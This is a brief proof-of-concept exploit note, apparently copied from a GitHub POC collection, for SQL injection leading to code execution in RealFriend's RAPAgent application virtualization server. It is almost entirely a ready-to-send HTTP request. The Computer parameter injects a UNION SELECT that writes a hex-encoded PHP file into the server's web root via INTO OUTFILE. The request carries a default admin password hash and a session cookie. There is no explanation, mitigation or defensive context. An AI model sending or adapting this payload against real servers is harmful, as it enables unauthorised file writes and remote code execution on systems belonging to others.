# ryty_sqli_to_rce

from : https://github.com/wy876/POC/blob/main/%E7%91%9E%E5%8F%8B%E5%BA%94%E7%94%A8%E8%99%9A%E6%8B%9F%E5%8C%96%E7%B3%BB%E7%BB%9F-RAPAgent%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md

2024.3.25 @2
```
/RAPAgent.XGI?CMD=GETApplication&AppID=APP00000001&Language=ZH-CN&User=admin&PWD=e10adc3949ba59abbe56e057f20f883e&AuthType=0&Computer=WIN-1TLJMBOFIT6%27%20union%20select%200x3c3f70687020706870696e666f28293b203f3e,2%20INTO%20OUTFILE%20%27C:/Program+Files+(x86)/RealFriend/Rap+Server/WebRoot/custom/InfoPage1.files/poctest.php%27--%20-&Finger=A45A2E5E3&IP= HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=53aiv0f86qi8v2v0ncfeg110f3; CookieLanguageName=ZH-CN
Connection: close
```
